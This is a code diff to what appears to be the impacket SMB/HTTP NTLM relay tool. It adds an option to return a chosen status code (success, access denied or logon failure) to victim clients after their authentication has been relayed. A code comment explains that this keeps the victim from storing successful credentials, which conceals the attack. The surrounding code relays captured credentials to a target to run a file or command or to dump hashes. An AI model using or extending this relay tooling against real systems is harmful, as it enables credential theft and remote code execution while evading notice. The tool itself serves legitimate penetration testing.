@@ -51,6 +51,7 @@ from impacket.dcerpc.v5 import nrpc
 from impacket.dcerpc.v5.ndr import NULL
 from impacket.spnego import ASN1_AID
 from impacket.smbconnection import SMBConnection
+from impacket.nt_errors import ERROR_MESSAGES
 
 try:
  from Crypto.Cipher import DES, AES, ARC4
@@ -396,11 +397,12 @@ class SMBClient(smb.SMB):
 
 class HTTPRelayServer(Thread):
     class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
-        def __init__(self, server_address, RequestHandlerClass, target, exeFile, command, mode, outputFile):
+        def __init__(self, server_address, RequestHandlerClass, target, exeFile, command, mode, outputFile, returnStatus = STATUS_SUCCESS):
             self.target = target
             self.exeFile = exeFile
             self.command = command
             self.mode = mode
+            self.returnStatus = returnStatus
             self.outputFile = outputFile
 
             SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)
@@ -474,7 +476,9 @@ class HTTPRelayServer(Thread):
                 self.challengeMessage = ntlm.NTLMAuthChallenge()
                 self.challengeMessage.fromString(clientChallengeMessage)
                 self.do_AUTHHEAD(message = 'NTLM '+base64.b64encode(clientChallengeMessage))
+
             elif messageType == 3:
+
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
                 if authenticateMessage['user_name'] != '' or self.target == '127.0.0.1':
@@ -528,6 +532,10 @@ class HTTPRelayServer(Thread):
     def setCommand(self, command):
         self.command = command
 
+    def setReturnStatus(self, returnStatus):
+        # Not implemented yet.
+        pass
+
     def setMode(self,mode):
         self.mode = mode
 
@@ -552,6 +560,7 @@ class SMBRelayServer(Thread):
         self.machineAccount = None
         self.machineHashes = None
         self.exeFile = None
+        self.returnStatus = STATUS_SUCCESS
         self.command = None
 
         # Here we write a mini config for the server
@@ -731,15 +740,19 @@ class SMBRelayServer(Thread):
                     del (smbData[self.target])
                     clientThread = doAttack(smbClient,self.exeFile,self.command)
                     clientThread.start()
+
                     # Now continue with the server
                 #############################################################
+
+                # Return status code of the authentication process.
+                errorCode = self.returnStatus
+                logging.info("Sending status code %s after authentication to %s" % (ERROR_MESSAGES[self.returnStatus][0], connData['ClientIP']))
 
                 respToken = SPNEGO_NegTokenResp()
                 # accept-completed
                 respToken['NegResult'] = '\x00'
 
                 # Status SUCCESS
-                errorCode = STATUS_SUCCESS
                 # Let's store it in the connection data
                 connData['AUTHENTICATE_MESSAGE'] = authenticateMessage
             else:
@@ -802,7 +815,8 @@ class SMBRelayServer(Thread):
 
             # Do the verification here, for just now we grant access
             # TODO: Manage more UIDs for the same session
-            errorCode = STATUS_SUCCESS
+            errorCode = self.returnStatus
+            logging.info("Sending status code %s after authentication to %s" % (ERROR_MESSAGES[self.returnStatus][0], connData['ClientIP']))
             connData['Uid'] = 10
             respParameters['Action'] = 0
 
@@ -837,6 +851,22 @@ class SMBRelayServer(Thread):
     def setCommand(self, command):
         self.command = command
 
+    def setReturnStatus(self, returnStatus):
+        # Specifies return status after successful relayed authentication to return
+        # to the connecting client. This comes useful when we don't want the connecting
+        # client to store successful credentials in his memory. Valid statuses:
+        # STATUS_SUCCESS - denotes that the connecting client passed valid credentials,
+        #                   which will make him store them accordingly.
+        # STATUS_ACCESS_DENIED - may occur for instance when the client is not a Domain Admin,
+        #                       and got configured Remote UAC, thus preventing connection to ADMIN$
+        # STATUS_LOGON_FAILURE - which will tell the connecting client that the passed credentials
+        #                       are invalid.
+        self.returnStatus = {
+            'success' : STATUS_SUCCESS,
+            'denied' : STATUS_ACCESS_DENIED,
+            'logon_failure' : STATUS_LOGON_FAILURE
+        }[returnStatus.lower()]
+
     def setMode(self,mode):
         self.mode = mode
 
@@ -855,6 +885,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will try to SMB relay that connection to the target system or the original client")
     parser.add_argument("--help", action="help", help='show this help message and exit')
     parser.add_argument('-h', action='store', metavar = 'HOST', help='Host to relay the credentials to, if not it will relay it back to the client')
+    parser.add_argument('-s', action='store', choices = {'success','denied','logon_failure' }, default='success', help='Status to return after client performed authentication. Default: "success".')
     parser.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
     parser.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
     parser.add_argument('-outputfile', action='store',
@@ -880,12 +911,14 @@ if __name__ == '__main__':
 
     exeFile = options.e
     Command = options.c
+    returnStatus = options.s
 
     for server in RELAY_SERVERS:
         s = server(options.outputfile)
         s.setTargets(targetSystem)
         s.setExeFile(exeFile)
         s.setCommand(Command)
+        s.setReturnStatus(returnStatus)
         s.setMode(mode)
         if options.machine_account is not None and options.machine_hashes is not None and options.domain is not None:
             s.setDomainAccount( options.machine_account,  options.machine_hashes,  options.domain)
